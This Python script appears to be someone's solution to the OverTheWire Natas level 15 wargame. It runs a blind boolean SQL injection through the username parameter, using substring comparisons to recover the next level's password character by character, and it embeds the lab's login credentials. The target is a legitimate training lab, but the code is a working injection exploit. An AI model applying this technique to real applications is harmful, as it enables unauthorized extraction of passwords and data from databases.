"""This script will brute force the pw for natas16 by performig get requests 
 that contain an sql injection, to natas15 website. This way the sql db is 
 analyzed and the pw is mapped out char by char. Based on the response 
we can see if we found another character of the password.

The payload was crafted through trial and error on the website.

Johannes Cartus, 23.03.2021
"""

import requests
import re

# login information
url = "http://natas15.natas.labs.overthewire.org"
user = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"



def main():

    natas16_password = ""

    for index in range(1, 33):

        for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
            
            #--- make payload ---
            #payload = "natas16" # intended use
            payload = f'natas16" AND substring(password,{index},1)=BINARY"{c}'

            print("[ ] " + payload)
            #---

            #--- make request ---
            session = requests.Session()
            response = session.get(
                url, 
                auth=(user, password),
                params={
                    "debug": "True",
                    "username": payload, 
                }    
            )
            #---

            #--- logging ---
            if re.search("exists", response.text):
                
                # store pw character
                natas16_password += c
                
                # report to user
                print(f"[#] Found a character nr. {index}: {c}")
                print(f"[#] Known part of pw: {natas16_password}")

                # continue with next character
                break
            
            elif re.search("error", response.text):
                print("[w] Error found!")

            else:
                print("[ ] no luck.")
            #---

    print("----------------------")
    print("[ ] We are done! Hurray :D")    
    print("[#] natas16 pw is: " + natas16_password)

if __name__ == '__main__':
    main()